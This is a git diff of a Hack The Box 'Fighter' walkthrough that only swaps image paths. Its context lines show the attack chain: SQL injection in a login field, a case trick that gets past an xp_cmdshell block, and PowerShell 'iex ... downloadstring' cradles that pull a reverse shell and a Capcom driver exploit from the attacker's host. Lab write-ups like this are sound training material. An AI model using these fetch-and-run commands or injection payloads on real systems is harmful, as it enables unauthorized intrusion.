@@ -20,7 +20,7 @@ With this, we can start proxying traffic through Burp.
 
 Port 80 shows a Street Fighter themed page:
 
-![](<../../../.gitbook/assets/image%20(56).png>)
+![](../../../.gitbook/assets/fighter-1.png)
 
 There's mention of a 'link' that we are supposed to know. Based on HTB trends, I added `streetfighterclub.htb` to the `/etc/hosts` file. Afterwards, I ran a `gobuster` directory and `wfuzz` subdomain scan on the site.
 
@@ -42,7 +42,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Interestingly, it just shows us a 403:
 
-![](<../../../.gitbook/assets/image%20(57).png>)
+![](../../../.gitbook/assets/fighter-2.png)
 
 I noted that this is running Microsoft IIS based on the error. I still ran a `gobuster` scan on this new subdomain, and found one directory:
 
@@ -99,7 +99,7 @@ We found a login page!
 
 The login page looked quite vulnerable to some stuff:
 
-![](<../../../.gitbook/assets/image%20(58).png>)
+![](../../../.gitbook/assets/fighter-3.png)
 
 Here's the POST request being sent back:
 
@@ -123,11 +123,11 @@ username=test&password=test&logintype=1&B1=LogIn
 
 There was a `logintype` variable, where 1 indicated Administrator and 2 was for Users. Adding any quotes to it causes an Interval Server Error:
 
-![](<../../../.gitbook/assets/image%20(59).png>)
+![](../../../.gitbook/assets/fighter-4.png)
 
 I tested this with some basic SQL Injection, and found that `;+--+-` works! We are redirected to the `Welcome.asp` page instead.
 
-![](<../../../.gitbook/assets/image%20(60).png>)
+![](../../../.gitbook/assets/fighter-5.png)
 
 So this login page was vulnerable to SQL Injection. I tested it a bit and found that there were 6 columns using UNION Injection:
 
@@ -169,7 +169,7 @@ However, I got no ping back. In this case, there might be something blocking us 
 
 Just use `XP_cmdshell` instead of `xp_cmdshell`, and the ping would work:
 
-![](<../../../.gitbook/assets/image%20(61).png>)
+![](../../../.gitbook/assets/fighter-6.png)
 
 Now, we just need to gain a reverse shell. Since there's something obviously blocking us on the machine, normal methods using `nc.exe` might not work. Oddly, running `powershell.exe` results in a 500, indicating that we might have to use the full PATH for it.
 
@@ -187,7 +187,7 @@ The final query looks like this:
 
 Take note to rename the shell to `REV.PS1` since the web request sent is in caps for some reason. Afterwards, we would get a shell:
 
-![](<../../../.gitbook/assets/image%20(62).png>)
+![](../../../.gitbook/assets/fighter-7.png)
 
 ## Privilege Escalation
 
@@ -308,7 +308,7 @@ cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.
 
 After waiting for a while, we would get a `decoder` shell:
 
-![](<../../../.gitbook/assets/image%20(63).png>)
+![](../../../.gitbook/assets/fighter-8.png)
 
 ### Driver Exploit -> SYSTEM
 
@@ -352,7 +352,7 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.11:443/capcom-all'
 
 Then, run the exploit:
 
-![](<../../../.gitbook/assets/image%20(64).png>)
+![](../../../.gitbook/assets/fighter-9.png)
 
 ### Root.exe + DLL RE -> Flag
 
@@ -387,15 +387,15 @@ We can bring these back to our machine for reverse engineering to find that pass
 
 Afterwards, I opened both in `ghidra`. `root.exe` had a function `FUN_00401000` that performed some character stuff:
 
-![](<../../../.gitbook/assets/image%20(67).png>)
+![](../../../.gitbook/assets/fighter-11.png)
 
 `checkdll.dll` had a function that XOR'd bytes with 9.
 
-![](<../../../.gitbook/assets/image%20(68).png>)
+![](../../../.gitbook/assets/fighter-12.png)
 
 The global variable can be found here by clicking on it:
 
-![](<../../../.gitbook/assets/image%20(66).png>)
+![](../../../.gitbook/assets/fighter-10.png)
 
 The encryption can be reversed easily by XOR-ing it with 9 and converting to characters.
 
@@ -424,4 +424,4 @@ OdioLaFeta
 
 Then, we can get the flag:
 
-![](<../../../.gitbook/assets/image%20(69).png>)
+![](../../../.gitbook/assets/fighter-13.png)
